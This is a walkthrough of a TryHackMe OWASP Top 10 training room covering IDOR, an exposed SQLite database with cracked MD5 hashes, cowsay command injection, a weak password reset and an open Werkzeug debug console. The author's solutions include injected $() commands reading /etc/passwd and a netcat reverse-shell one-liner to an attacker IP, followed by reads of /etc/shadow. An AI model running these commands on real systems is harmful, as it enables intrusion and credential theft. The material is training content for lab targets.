# OWASP Top 10 - 2021 — Writeup

## Overview
### OWASP Top 10 - 2021 — Writeup
### OWASP Top 10 - 2021 — Writeup
----
Learn about and exploit each of the OWASP Top 10 vulnerabilities; the 10 most critical web security risks.
---
![](https://i.imgur.com/sP6d0iZ.png)
### Introduction
This room breaks each OWASP topic down and includes details on the vulnerabilities, how they occur, and how you can exploit them. You will put the theory into practice by completing supporting challenges.
1.  Broken Access Control
2.  Cryptographic Failures
3.  Injection
4.  Insecure Design
5.  Security Misconfiguration
6.  Vulnerable and Outdated Components
7.  Identification and Authentication Failures
8.  Software and Data Integrity Failures
9.  Security Logging & Monitoring Failures
10.  Server-Side Request Forgery (SSRF)
The room has been designed for beginners and assumes no previous security knowledge.
Answer the questions below
Read the above.
Question Done
### Accessing Machines
Start Machine
![Connect to THM](https://assets.tryhackme.com/img/illustrations/tryhackme_connect.png)
Some tasks will have you learning by doing, often through hacking a virtual machine. First, let's start the Virtual Machine by pressing the Start Machine button at the top of this task.
To access these machines, you need to either:
Connect using OpenVPN
Follow the guide [here](https://tryhackme.com/access) to connect using OpenVPN.
[![Connect using OpenVPN](https://tryhackme.com/img/connect/thm_use_openvpn.png)](https://tryhackme.com/access)
﻿Use an in-browser Linux Machine
If you're [subscribed](https://tryhackme.com/profile#subscribe), deploy the [in-browser](https://tryhackme.com/my-machine) AttackBox!
[![Connect using AttackBox](https://tryhackme.com/img/connect/thm_use_kali.png)](https://tryhackme.com/my-machine)
Answer the questions below
Connect to our network or deploy the AttackBox.
Completed
### 1. Broken Access Control
Websites have pages that are protected from regular visitors. For example, only the site's admin user should be able to access a page to manage other users. If a website visitor can access protected pages they are not meant to see, then the access controls are broken.
A regular visitor being able to access protected pages can lead to the following:
-   Being able to view sensitive information from other users
-   Accessing unauthorized functionality
Simply put, broken access control allows attackers to bypass **authorisation**, allowing them to view sensitive data or perform tasks they aren't supposed to.
For example, a [vulnerability was found in 2019](https://bugs.xdavidhu.me/google//stealing-your-private-videos-one-frame-at-a-time/), where an attacker could get any single frame from a Youtube video marked as private. The researcher who found the vulnerability showed that he could ask for several frames and somewhat reconstruct the video. Since the expectation from a user when marking a video as private would be that nobody had access to it, this was indeed accepted as a broken access control vulnerability.
Answer the questions below
Read and understand what broken access control is.
Completed
### Broken Access Control (IDOR Challenge)
Insecure Direct Object Reference
**IDOR** or **Insecure Direct Object Reference** refers to an access control vulnerability where you can access resources you wouldn't ordinarily be able to see. This occurs when the programmer exposes a Direct Object Reference, which is just an identifier that refers to specific objects within the server. By object, we could mean a file, a user, a bank account in a banking application, or anything really.
For example, let's say we're logging into our bank account, and after correctly authenticating ourselves, we get taken to a URL like this `https://bank.thm/account?id=111111`. On that page, we can see all our important bank details, and a user would do whatever they need to do and move along their way, thinking nothing is wrong.
There is, however, a potentially huge problem here, anyone may be able to change the `id` parameter to something else like `222222`, and if the site is incorrectly configured, then he would have access to someone else's bank information.
The application exposes a direct object reference through the `id` parameter in the URL, which points to specific accounts. Since the application isn't checking if the logged-in user owns the referenced account, an attacker can get sensitive information from other users because of the IDOR vulnerability. Notice that direct object references aren't the problem, but rather that the application doesn't validate if the logged-in user should have access to the requested account.
Answer the questions below
Read and understand how IDOR works.
Completed
Deploy the machine and go to [http://10.10.172.206](http://10.10.172.206/)[](http://10.10.172.206/) - Login with the username noot and the password test1234.
Completed
Look at other users' notes. What is the flag?
The URL contains ?note_id=1 - I wonder what happens if you change the parameter value? You might be able to access another user's notes.
```text
GET /note.php?note_id=0 HTTP/1.1

<pre>flag{fivefourthree}</pre>
```
### 2. Cryptographic Failures
Cryptographic Failures
A **cryptographic failure** refers to any vulnerability arising from the misuse (or lack of use) of cryptographic algorithms for protecting sensitive information. Web applications require cryptography to provide confidentiality for their users at many levels.
Take, for example, a secure email application:
-   When you are accessing your email account using your browser, you want to be sure that the communications between you and the server are encrypted. That way, any eavesdropper trying to capture your network packets won't be able to recover the content of your email addresses. When we encrypt the network traffic between the client and server, we usually refer to this as **encrypting data in transit**.
-   Since your emails are stored in some server managed by your provider, it is also desirable that the email provider can't read their client's emails. To this end, your emails might also be encrypted when stored on the servers. This is referred to as **encrypting data at rest**.
Cryptographic failures often end up in web apps accidentally divulging sensitive data. This is often data directly linked to customers (e.g. names, dates of birth, financial information), but it could also be more technical information, such as usernames and passwords.
At more complex levels, taking advantage of some cryptographic failures often involves techniques such as "Man in The Middle Attacks", whereby the attacker would force user connections through a device they control. Then, they would take advantage of weak encryption on any transmitted data to access the intercepted information (if the data is even encrypted in the first place). Of course, many examples are much simpler, and vulnerabilities can be found in web apps that can be exploited without advanced networking knowledge. Indeed, in some cases, the sensitive data can be found directly on the web server itself.
The web application in this box contains one such vulnerability. To continue, read through the supporting material in the following tasks.
Answer the questions below
Read the introduction to Cryptographic Failures and deploy the machine.
Completed
### Cryptographic Failures (Supporting Material 1)
The most common way to store a large amount of data in a format easily accessible from many locations is in a database. This is perfect for something like a web application, as many users may interact with the website at any time. Database engines usually follow the Structured Query Language (SQL) syntax.
In a production environment, it is common to see databases set up on dedicated servers running a database service such as MySQL or MariaDB; however, databases can also be stored as files. These are referred to as "flat-file" databases, as they are stored as a single file on the computer. This is much easier than setting up an entire database server and could potentially be seen in smaller web applications. Accessing a database server is outwith the scope of today's task, so let's focus instead on flat-file databases.
As mentioned previously, flat-file databases are stored as a file on the disk of a computer. Usually, this would not be a problem for a web app, but what happens if the database is stored underneath the root directory of the website (i.e. one of the files accessible to the user connecting to the website)? Well, we can download and query it on our own machine, with full access to everything in the database. Sensitive Data Exposure, indeed!
That is a big hint for the challenge, so let's briefly cover some of the syntax we would use to query a flat-file database.
The most common (and simplest) format of a flat-file database is an SQLite database. These can be interacted with in most programming languages and have a dedicated client for querying them on the command line. This client is called `sqlite3` and is installed on many Linux distributions by default.
Let's suppose we have successfully managed to download a database:
Linux
```shell-session
user@linux$ ls -l 
-rw-r--r-- 1 user user 8192 Feb  2 20:33 example.db
                                                                                                                                                              
user@linux$ file example.db 
example.db: SQLite 3.x database, last written using SQLite version 3039002, file counter 1, database pages 2, cookie 0x1, schema 4, UTF-8, version-valid-for 1
```
We can see that there is an SQLite database in the current folder.
To access it, we use `sqlite3 <database-name>`:
Linux
```shell-session
user@linux$ sqlite3 example.db                     
SQLite version 3.39.2 
Enter ".help" for usage hints.
sqlite>
```
From here, we can see the tables in the database by using the `.tables` command:
Linux
```shell-session
user@linux$ sqlite3 example.db                     
SQLite version 3.39.2 
Enter ".help" for usage hints.
sqlite> .tables
customers
```
At this point, we can dump all the data from the table, but we won't necessarily know what each column means unless we look at the table information. First, let's use `PRAGMA table_info(customers);` to see the table information. Then we'll use `SELECT * FROM customers;` to dump the information from the table:
Linux

## Exploitation
```shell-session
sqlite> PRAGMA table_info(customers);
0|cudtID|INT|1||1
1|custName|TEXT|1||0
2|creditCard|TEXT|0||0
3|password|TEXT|1||0

sqlite> SELECT * FROM customers;
0|Joy Paulson|4916 9012 2231 7905|5f4dcc3b5aa765d61d8327deb882cf99
1|John Walters|4671 5376 3366 8125|fef08f333cc53594c8097eba1f35726a
2|Lena Abdul|4353 4722 6349 6685|b55ab2470f160c331a99b8d8a1946b19
3|Andrew Miller|4059 8824 0198 5596|bc7b657bd56e4386e3397ca86e378f70
4|Keith Wayman|4972 1604 3381 8885|12e7a36c0710571b3d827992f4cfe679
5|Annett Scholz|5400 1617 6508 1166|e2795fc96af3f4d6288906a90a52a47f
```
We can see from the table information that there are four columns: `custID`, `custName`, `creditCard` and `password`. You may notice that this matches up with the results. Take the first row:
`0|Joy Paulson|4916 9012 2231 7905|5f4dcc3b5aa765d61d8327deb882cf99   `
We have the custID (0), the custName (Joy Paulson), the creditCard (4916 9012 2231 7905) and a password hash (5f4dcc3b5aa765d61d8327deb882cf99).
In the next task, we'll look at cracking this hash.
Answer the questions below
Read and understand the supporting material on SQLite Databases.
Completed
### Cryptographic Failures (Supporting Material 2)
We saw how to query an SQLite database for sensitive data in the previous task. We found a collection of password hashes, one for each user. In this task, we will briefly cover how to crack these.
When it comes to hash cracking, Kali comes pre-installed with various tools. If you know how to use these, then feel free to do so; however, they are outwith the scope of this material.
Instead, we will be using the online tool: [Crackstation](https://crackstation.net/). This website is extremely good at cracking weak password hashes. For more complicated hashes, we would need more sophisticated tools; however, all of the crackable password hashes used in today's challenge are weak MD5 hashes, which Crackstation should handle very nicely.
When we navigate to the website, we are met with the following interface:
Let's try pasting the password hash for Joy Paulson, which we found in the previous task (`5f4dcc3b5aa765d61d8327deb882cf99`). We solve the Captcha, then click the "Crack Hashes" button:
We see that the hash was successfully broken, and the user's password was "password". How secure!
It's worth noting that Crackstation works using a massive wordlist. If the password is not in the wordlist, then Crackstation will not be able to break the hash.
The challenge is guided, so if Crackstation fails to break a hash in today's box, you can assume that the hash has been specifically designed not to be crackable.
Answer the questions below
Read the supporting material about cracking hashes.
Completed
### Cryptographic Failures (Challenge)
It's now time to put what you've learnt into practice! For this challenge, connect to the web application at [http://10.10.172.206:81/](http://10.10.172.206:81/).
Answer the questions below
```text
view-source:http://10.10.172.206:81/login.php

<!-- Must remember to do something better with the database than store it in /assets... -->

Index of /assets

    Parent Directory
    css/
    fonts/
    images/
    js/
    webapp.db

┌──(witty㉿kali)-[~/Downloads]
└─$ file webapp.db                                                   
webapp.db: SQLite 3.x database, last written using SQLite version 3022000, file counter 255, database pages 7, 1st free page 5, free pages 1, cookie 0x6, schema 4, UTF-8, version-valid-for 255

┌──(witty㉿kali)-[~/Downloads]
└─$ sqlite3 webapp.db                                                
SQLite version 3.40.1 
Enter ".help" for usage hints.
sqlite> .tables
sessions  users   
sqlite> PRAGMA table_info(sessions);
0|sessionID|TEXT|1||1
1|userID|TEXT|1||0
2|expiry|INT|1||0
sqlite> PRAGMA table_info(users);
0|userID|TEXT|1||1
1|username|TEXT|1||0
2|password|TEXT|1||0
3|admin|INT|1||0
sqlite> select * from sessions;
sqlite> select * from users;
4413096d9c933359b898b6202288a650|admin|6eea9b7ef19179a06954edd0f6c05ceb|1
23023b67a32488588db1e28579ced7ec|Bob|ad0234829205b9033196ba818f7a872b|1
4e8423b514eef575394ff78caed3254d|Alice|268b38ca7b84f44fa0a6cdc86e6301e0|0

  
qwertyuiop

login

Well done.
Your flag is: THM{Yzc2YjdkMjE5N2VjMzNhOTE3NjdiMjdl}
```
Have a look around the web app. The developer has left themselves a note indicating that there is sensitive data in a specific directory.
What is the name of the mentioned directory?
Have a look at the source code on the /login page.
*/assets*
Navigate to the directory you found in question one. What file stands out as being likely to contain sensitive data?
*webapp.db*
Use the supporting material to access the sensitive data. What is the password hash of the admin user?
*6eea9b7ef19179a06954edd0f6c05ceb*
Crack the hash.
What is the admin's plaintext password?
Read the supporting material.
*qwertyuiop*
Log in as the admin. What is the flag?
![[Pasted image 20230309121641.png]]
### 3. Injection
Injection
Injection flaws are very common in applications today. These flaws occur because the application interprets user-controlled input as commands or parameters. Injection attacks depend on what technologies are used and how these technologies interpret the input. Some common examples include:
-   **SQL Injection:** This occurs when user-controlled input is passed to SQL queries. As a result, an attacker can pass in SQL queries to manipulate the outcome of such queries. This could potentially allow the attacker to access, modify and delete information in a database when this input is passed into database queries. This would mean an attacker could steal sensitive information such as personal details and credentials.
-   **Command Injection:** This occurs when user input is passed to system commands. As a result, an attacker can execute arbitrary system commands on application servers, potentially allowing them to access users' systems.
The main defence for preventing injection attacks is ensuring that user-controlled input is not interpreted as queries or commands. There are different ways of doing this:
-   **Using an allow list:** when input is sent to the server, this input is compared to a list of safe inputs or characters. If the input is marked as safe, then it is processed. Otherwise, it is rejected, and the application throws an error.
-   **Stripping input:** If the input contains dangerous characters, these are removed before processing.
Dangerous characters or input is classified as any input that can change how the underlying data is processed. Instead of manually constructing allow lists or stripping input, various libraries exist that can perform these actions for you.
Answer the questions below
I've understood Injection attacks.
Completed
### 3.1. Command Injection
Command Injection
Command Injection occurs when server-side code (like PHP) in a web application makes a call to a function that interacts with the server's console directly. An injection web vulnerability allows an attacker to take advantage of that call to execute operating system commands arbitrarily on the server. The possibilities for the attacker from here are endless: they could list files, read their contents, run some basic commands to do some recon on the server or whatever they wanted, just as if they were sitting in front of the server and issuing commands directly into the command line.
Once the attacker has a foothold on the web server, they can start the usual enumeration of your systems and look for ways to pivot around.
Code Example
Let's consider a scenario: MooCorp has started developing a web-based application for cow ASCII art with customisable text. While searching for ways to implement their app, they've come across the `cowsay` command in Linux, which does just that! Instead of coding a whole web application and the logic required to make cows talk in ASCII, they decide to write some simple code that calls the cowsay command from the operating system's console and sends back its contents to the website.
Let's look at the code they used for their app.  See if you can determine why their implementation is vulnerable to command injection.  We'll go over it below.
```php
<?php
    if (isset($_GET["mooing"])) {
        $mooing = $_GET["mooing"];
        $cow = 'default';

        if(isset($_GET["cow"]))
            $cow = $_GET["cow"];
        
        passthru("perl /usr/bin/cowsay -f $cow $mooing");
    }
?>
```
In simple terms, the above snippet does the following:
1.  Checking if the parameter "mooing" is set. If it is, the variable `$mooing` gets what was passed into the input field.
2.  Checking if the parameter "cow" is set. If it is, the variable `$cow` gets what was passed through the parameter.
3.  The program then executes the function `passthru("perl /usr/bin/cowsay -f $cow $mooing");`. The passthru function simply executes a command in the operating system's console and sends the output back to the user's browser. You can see that our command is formed by concatenating the $cow and $mooing variables at the end of it. Since we can manipulate those variables, we can try injecting additional commands by using simple tricks. If you want to, you can read the docs on `passthru()` on [PHP's website](https://www.php.net/manual/en/function.passthru.php) for more information on the function itself.
Exploiting Command Injection
Now that we know how the application works behind the curtains, we will take advantage of a bash feature called "inline commands" to abuse the cowsay server and execute any arbitrary command we want. Bash allows you to run commands within commands. This is useful for many reasons, but in our case, it will be used to inject a command within the cowsay server to get it executed.
To execute inline commands, you only need to enclose them in the following format `$(your_command_here)`. If the console detects an inline command, it will execute it first and then use the result as the parameter for the outer command. Look at the following example, which runs `whoami` as an inline command inside an `echo` command:
So coming back to the cowsay server, here's what would happen if we send an inline command to the web application:
Since the application accepts any input from us, we can inject an inline command which will get executed and used as a parameter for cowsay. This will make our cow say whatever the command returns! In case you are not that familiar with Linux, here are some other commands you may want to try:
-   whoami
-   id
-   ifconfig/ip addr
-   uname -a
-   ps -ef
To complete the questions below, navigate to [http://10.10.172.206:82/](http://10.10.172.206:82/)[](http://10.10.172.206:82/) and exploit the cowsay server.
Answer the questions below
```text
$(ls)

< css drpepper.txt index.php js >
 ------------------------------- 
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||

$(getent passwd | awk -F: '$3>=1000 && $1!="nobody" {print $1}')

 _ 
<   >
 - 
       \   ,__,
        \  (oo)____
           (__)    )\
              ||--|| *

$(whoami)

 ________ 
< apache >
 -------- 
   \
    \
        .--.
       |o_o |
       |:_/ |
      //   \ \
     (|     | )
    /'\_   _/`\
    \___)=(___/

$(grep "^apache:" /etc/passwd | cut -d: -f7)

 _______________ 
< /sbin/nologin >
 --------------- 
      \                    / \  //\
       \    |\___/|      /   \//  \\
            /0  0  \__  /    //  | \ \    
           /     /  \/_/    //   |  \  \  
           @_^_@'/   \/_   //    |   \   \ 
           //_^_/     \/_ //     |    \    \
        ( //) |        \///      |     \     \
      ( / /) _|_ /   )  //       |      \     _\
    ( // /) '/,_ _ _/  ( ; -.    |    _ _\.-~        .-~~~^-.
  (( / / )) ,-{        _      `-.|.-~-.           .~         `.
 (( // / ))  '/\      /                 ~-. _ .-~      .-~^-.  \
 (( /// ))      `.   {            }                   /      \  \
  (( / ))     .----~-.\        \-'                 .~         \  `. \^-.
             ///.----..>        \             _ -~             `.  ^-`  ^-_
               ///-._ _ _ _ _ _ _}^ - - - - ~                     ~-- ,.-~

$(cat /etc/alpine-release)

 ________ 
< 3.16.0 >
 -------- 
     \
      \
       ("`-'  '-/") .___..--' ' "`-._
         ` *_ *  )    `-.   (      ) .`-.__. `)
         (_Y_.) ' ._   )   `._` ;  `` -. .-'
      _.. `--'_..-_/   /--' _ .' ,4
   ( i l ),-''  ( l i),'  ( ( ! .-'
```
What strange text file is in the website's root directory?
*drpepper.txt*
How many non-root/non-service/non-daemon users are there?
*0*
What user is this app running as?
*apache*
What is the user's shell set as?
*/sbin/nologin*
What version of Alpine Linux is running?
*3.16.0*
### 4. Insecure Design
Insecure Design
**Insecure design** refers to vulnerabilities which are inherent to the application's architecture. They are not vulnerabilities regarding bad implementations or configurations, but the idea behind the whole application (or a part of it) is flawed from the start. Most of the time, these vulnerabilities occur when an improper threat modelling is made during the planning phases of the application and propagate all the way up to your final app. Some other times, insecure design vulnerabilities may also be introduced by developers while adding some "shortcuts" around the code to make their testing easier. A developer could, for example, disable the OTP validation in the development phases to quickly test the rest of the app without manually inputting a code at each login but forget to re-enable it when sending the application to production.
Insecure Password Resets
A good example of such vulnerabilities occurred on [Instagram a while ago](https://thezerohack.com/hack-any-instagram). Instagram allowed users to reset their forgotten passwords by sending them a 6-digit code to their mobile number via SMS for validation. If an attacker wanted to access a victim's account, he could try to brute-force the 6-digit code. As expected, this was not directly possible as Instagram had rate-limiting implemented so that after 250 attempts, the user would be blocked from trying further.
However, it was found that the rate-limiting only applied to code attempts made from the same IP. If an attacker had several different IP addresses from where to send requests, he could now try 250 codes per IP. For a 6-digit code, you have a million possible codes, so an attacker would need 1000000/250 = 4000 IPs to cover all possible codes. This may sound like an insane amount of IPs to have, but cloud services make it easy to get them at a relatively small cost, making this attack feasible.
Notice how the vulnerability is related to the idea that no user would be capable of using thousands of IP addresses to make concurrent requests to try and brute-force a numeric code. The problem is in the design rather than the implementation of the application in itself.
Since insecure design vulnerabilities are introduced at such an early stage in the development process, resolving them often requires rebuilding the vulnerable part of the application from the ground up and is usually harder to do than any other simple code-related vulnerability. The best approach to avoid such vulnerabilities is to perform threat modelling at the early stages of the development lifecycle. To get more information on how to implement secure development lifecycles, be sure to check out the [SSDLC room](https://tryhackme.com/room/securesdlc).
Practical Example
Navigate to [http://10.10.89.200:85](http://10.10.89.200:85/) and get into joseph's account. This application also has a design flaw in its password reset mechanism. Can you figure out the weakness in the proposed design and how to abuse it?
Answer the questions below
```text
What's your favourite color?
green
Password Reset

Success: The password for user joseph has been reset to 0LCfXYB9bpaWPE

notes.txt

Remember to move private files out of the server!

flag.txt

THM{Not_3ven_c4tz_c0uld_sav3_U!}

cat img
```
![[Pasted image 20230309132927.png]]
![[Pasted image 20230309134043.png]]
Try to reset joseph's password. Keep in mind the method used by the site to validate if you are indeed joseph.
Completed
What is the value of the flag in joseph's account?
Is there any security question that can be easily guessed?
### 5. Security Misconfiguration
Security Misconfiguration
Security Misconfigurations are distinct from the other Top 10 vulnerabilities because they occur when security could have been appropriately configured but was not. Even if you download the latest up-to-date software, poor configurations could make your installation vulnerable.
Security misconfigurations include:
-   Poorly configured permissions on cloud services, like S3 buckets.
-   Having unnecessary features enabled, like services, pages, accounts or privileges.
-   Default accounts with unchanged passwords.
-   Error messages that are overly detailed and allow attackers to find out more about the system.
-   Not using [HTTP security headers](https://owasp.org/www-project-secure-headers/).
This vulnerability can often lead to more vulnerabilities, such as default credentials giving you access to sensitive data, XML External Entities (XXE) or command injection on admin pages.
For more info, look at the [OWASP top 10 entry for Security Misconfiguration](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/).
Debugging Interfaces
A common security misconfiguration concerns the exposure of debugging features in production software. Debugging features are often available in programming frameworks to allow the developers to access advanced functionality that is useful for debugging an application while it's being developed. Attackers could abuse some of those debug functionalities if somehow, the developers forgot to disable them before publishing their applications.
One example of such a vulnerability was allegedly used when [Patreon got hacked in 2015](https://labs.detectify.com//how-patreon-got-hacked-publicly-exposed-werkzeug-debugger/). Five days before Patreon was hacked, a security researcher reported to Patreon that he had found an open debug interface for a Werkzeug console. Werkzeug is a vital component in Python-based web applications as it provides an interface for web servers to execute the Python code. Werkzeug includes a debug console that can be accessed either via URL on `/console`, or it will also be presented to the user if an exception is raised by the application. In both cases, the console provides a Python console that will run any code you send to it. For an attacker, this means he can execute commands arbitrarily.
Practical example
This VM showcases a `Security Misconfiguration` as part of the OWASP Top 10 Vulnerabilities list.
Navigate to [http://10.10.89.200:86](http://10.10.89.200:86/) and try to exploit the security misconfiguration to read the application's source code.
Answer the questions below
```text
[console ready]
>>> print('hi')
hi
>>> import os; print(os.popen("ls -l").read())
total 24
-rw-r--r--    1 root     root           249 Sep 15 05:07 Dockerfile
-rw-r--r--    1 root     root          1411 Feb  3 04:28 app.py
-rw-r--r--    1 root     root           137 Sep 15 05:05 requirements.txt
drwxr-xr-x    2 root     root          4096 Sep 15 05:06 templates
-rw-r--r--    1 root     root          8192 Mar  9 18:47 todo.db

>>> import os; print(os.popen("cat app.py").read())
import os
from flask import Flask, render_template, request, redirect, url_for
from flask_sqlalchemy import SQLAlchemy

secret_flag = "THM{Just_a_tiny_misconfiguration}"

PROJECT_ROOT = os.path.dirname(os.path.realpath(__file__))
DATABASE = os.path.join(PROJECT_ROOT, 'todo.db')

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = "sqlite:////" + DATABASE
db = SQLAlchemy(app)

class Todo(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    title = db.Column(db.String(80))
    complete = db.Column(db.Boolean)

@app.route("/")
def index():
    todo_list = Todo.query.all()
    return render_template("index.html", todo_list=todo_list)

@app.route("/add", methods=["POST"])
def add():
    title = request.form.get("title")
    new_todo = Todo(title=title, complete=False)
    db.session.add(new_todo)
    db.session.commit()
    return redirect(url_for("index"))

@app.route("/complete/<string:todo_id>")
def complete(todo_id):
    todo = Todo.query.filter_by(id=todo_id).first()
    todo.complete = not todo.complete
    db.session.commit()
    return redirect(url_for("index"))

@app.route("/delete/<string:todo_id>")
def delete(todo_id):
    todo = Todo.query.filter_by(id=todo_id).first()
    db.session.delete(todo)
    db.session.commit()
    return redirect(url_for("index"))

if __name__ == "__main__":
    db.create_all()
    app.run(host='0.0.0.0', port=5000, debug=True)

RCE
revshell

import os; print(os.popen("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.8.19.103 1337 >/tmp/f").read())

┌──(witty㉿kali)-[~/Downloads]
└─$ rlwrap nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.89.200] 34447
sh: can't access tty; job control turned off
/usr/src/app # cd /tmp
/tmp # ls
f
/tmp # cat /etc/passwd
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
/tmp # cat /etc/shadow
root:*::0:::::
bin:!::0:::::
daemon:!::0:::::
adm:!::0:::::
lp:!::0:::::
sync:!::0:::::
shutdown:!::0:::::
halt:!::0:::::
mail:!::0:::::
news:!::0:::::
uucp:!::0:::::
operator:!::0:::::
man:!::0:::::
postmaster:!::0:::::
cron:!::0:::::
ftp:!::0:::::
sshd:!::0:::::
at:!::0:::::
squid:!::0:::::
xfs:!::0:::::
games:!::0:::::
cyrus:!::0:::::
vpopmail:!::0:::::
ntp:!::0:::::
smmsp:!::0:::::
guest:!::0:::::
nobody:!::0:::::
/tmp # ls -lah /
total 68K    
drwxr-xr-x    1 root     root        4.0K Feb  3 05:09 .
drwxr-xr-x    1 root     root        4.0K Feb  3 05:09 ..
-rwxr-xr-x    1 root     root           0 Feb  3 05:09 .dockerenv
drwxr-xr-x    1 root     root        4.0K Sep  7  2022 bin
drwxr-xr-x    5 root     root         340 Mar  9 17:45 dev
drwxr-xr-x    1 root     root        4.0K Feb  3 05:09 etc
